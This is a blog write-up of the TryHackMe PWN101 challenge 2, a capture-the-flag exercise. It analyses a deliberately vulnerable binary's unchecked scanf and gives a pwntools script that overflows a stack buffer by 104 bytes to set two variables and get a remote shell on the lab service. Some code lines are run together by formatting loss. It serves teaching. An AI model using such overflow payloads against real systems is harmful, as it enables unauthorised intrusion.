---
layout: post
title: 'TryHackMe PWN101 Challenge2 Writeup'
date: 2025-09-08 02:40:14 +0000
categories: [cybersecurity]
tags:
  - tryhackme
  - writeup
  - ctf
description: "Intermediate level binary exploitation challenges."
canonical_url: "https://medium.com/@hemanthakrishnach/tryhackme-pwn101-challenge2-writeup-82a31cf111af"
image: "/assets/images/posts/tryhackme-pwn101-challenge2-writeup/img-000-5563d17a.png"
---

Intermediate level binary exploitation challenges.

---

Intermediate level binary exploitation challenges.![image](/assets/images/posts/tryhackme-pwn101-challenge2-writeup/img-000-5563d17a.png)![image](/assets/images/posts/tryhackme-pwn101-challenge2-writeup/img-001-f5ef0620.png)

Room link: [https://tryhackme.com/room/pwn101](https://www.youtube.com/redirect?event=video_description&redir_token=QUFFLUhqa1E4QjJxcHZJZXQxSUxLMGd2cVY5TVBOMGltZ3xBQ3Jtc0ttTURpVTdZSlJsOWpBcUFUNTU3bTg0TTVBM0xqOWw1bXZPbzR3X2Y4SkJkTUdBOFhhNW9SQkVmcWFUcnJsbWNMRGhiYkxLcFFnX05SNkZ2MG5FRzdJMTItdXlNZ0lDN2RIdi0zZmsyM3ZRNmdGbkEtUQ&q=https%3A%2F%2Ftryhackme.com%2Froom%2Fpwn101&v=8FEYdpZdftQ)

### Challenge 2

#### Connecting to the Challenge

The challenge is running on port **9002**

The service can be reached with:
```bash
nc 10.201.126.158 9002
```
![image](/assets/images/posts/tryhackme-pwn101-challenge2-writeup/img-002-747dd866.png)

I also downloaded the provided binary to my Kali VM for local analysis. Tools like **GDB**, **pwntools**, **Cutter**, or **Ghidra** are all useful here. I primarily used GDB and pwntools.![image](/assets/images/posts/tryhackme-pwn101-challenge2-writeup/img-003-05a9a8a4.png)

Inside gdb, i used *info functions* to look at the functions of the binary.
```bash
info functions
```
![image](/assets/images/posts/tryhackme-pwn101-challenge2-writeup/img-004-d06cbba9.png)

Now lets examine the dissambly of main to see whats happening
```bash
disass main
```
![image](/assets/images/posts/tryhackme-pwn101-challenge2-writeup/img-005-88bff6e6.png)

### Understanding `main`

1. First the main functions calls setup() and banner() to print the banner. then it sets two local variables

![image](/assets/images/posts/tryhackme-pwn101-challenge2-writeup/img-006-f5a55fd2.png)
```perl
movl $0xbadf00d,-0x4(%rbp) ; var1 = 0xbadf00dmovl $0xfee1dead,-0x8(%rbp) ; var2 = 0xfee1dead
```

This prints![image](/assets/images/posts/tryhackme-pwn101-challenge2-writeup/img-007-3bc3f819.png)

2. A local buffer of **0x70 (112) bytes** is allocated.![image](/assets/images/posts/tryhackme-pwn101-challenge2-writeup/img-008-f06134c8.png)

3. User input is read into it with `scanf("%s", buffer) -`no bounds checking!![image](/assets/images/posts/tryhackme-pwn101-challenge2-writeup/img-009-2235973b.png)

4. After reading input, the program checks:![image](/assets/images/posts/tryhackme-pwn101-challenge2-writeup/img-010-519f536c.png)
```perl
cmpl $0xc0ff33,-0x4(%rbp) ; does var1 == 0xc0ff33?jne failcmpl $0xc0d3,-0x8(%rbp) ; does var2 == 0xc0d3?jne fail
```

- If both match → print success, call `system("/bin/sh")`.- Otherwise → print failure message.

### Goal

- At program start, the “magic” values are:

```ini
var1 = 0x0badf00d var2 = 0xfee1dead
```

- To get a shell, we need:

```ini
var1 == 0x00c0ff33 var2 == 0x0000c0d3
```

### Stack Layout

From disassembly:
```scss
buffer → [rbp-0x70] (112 bytes)var2 → [rbp-0x8] (4 bytes)var1 → [rbp-0x4] (4 bytes)
```

So the layout in memory is:
```bash
[ buffer (104 bytes) ] [ var2 (4 bytes) ] [ var1 (4 bytes) ]
```

#### Why 104 bytes and not 112?

Because `var2` is only 0x68 (104) bytes above the buffer start (`0x70 - 0x08`). Writing 104 bytes fills the buffer exactly up to `var2`. Then the next 8 bytes overwrite `var2` and `var1`.

So, to get the shell, we need to write all the bytes from rbp-0x70 to rbp-0x08 , that is 104 bytes into the buffer, overwrite var1 and var2, and set them to the above values.

### Payload Construction

Final layout:
```bash
”A” * 104 # filler to reach var2+ 0x0000c0d3 # overwrite var2+ 0x00c0ff33 # overwrite var1
```

### Exploit Script

I used **pwntools** to do this
```makefile
from pwn import *# set up pwntools contextcontext.binary=binary="./pwn102-1644307392479.pwn102"# connect to remotep = remote("10.201.126.158", 9002) # Replace with you machine IP# build payloadpayload  = b"A" * 104payload += p32(0x0000c0d3)   # Setting var2 = 0x0000c0d3payload += p32(0x00c0ff33)   # Setting var1 = 0x00c0ff33# send payloadp.sendline(payload)# get interactive shellp.interactive()
```

### Result

![image](/assets/images/posts/tryhackme-pwn101-challenge2-writeup/img-011-347e726b.png)

Running the exploit:

- Overwrites the two local variables with the required values.- Passes the validation checks.- Executes `system("/bin/sh")`.- Grants us a shell on the remote challenge service.

### Key Takeaway

The vulnerability is an **unchecked buffer in** `scanf`, and careful calculation of the buffer-to-variable distance (104 bytes) lets us control critical stack variables and redirect execution flow to spawn a shell.

### Thank you reading, see you in the next challenge!
